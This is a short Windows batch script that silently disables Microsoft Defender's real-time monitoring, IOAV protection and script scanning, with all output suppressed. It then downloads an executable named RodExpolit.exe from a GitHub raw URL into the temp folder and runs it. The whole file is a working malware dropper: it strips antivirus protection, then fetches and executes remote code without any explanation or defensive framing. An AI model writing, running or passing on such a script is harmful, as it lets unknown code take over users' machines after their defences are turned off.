@echo off
setlocal

powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableIOAVProtection $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableScriptScanning $true" >nul 2>&1

set "file_url=https://github.com/lukka1s/1/raw/refs/heads/main/RodExpolit.exe"

set "save_path=%TEMP%\RodExpolit.exe"

powershell -Command "Invoke-WebRequest -Uri '%file_url%' -OutFile '%save_path%' -UseBasicParsing" >nul 2>&1

if exist "%save_path%" (
    start "" "%save_path%" >nul 2>&1
    exit /b 0
) else (
    exit /b 1
)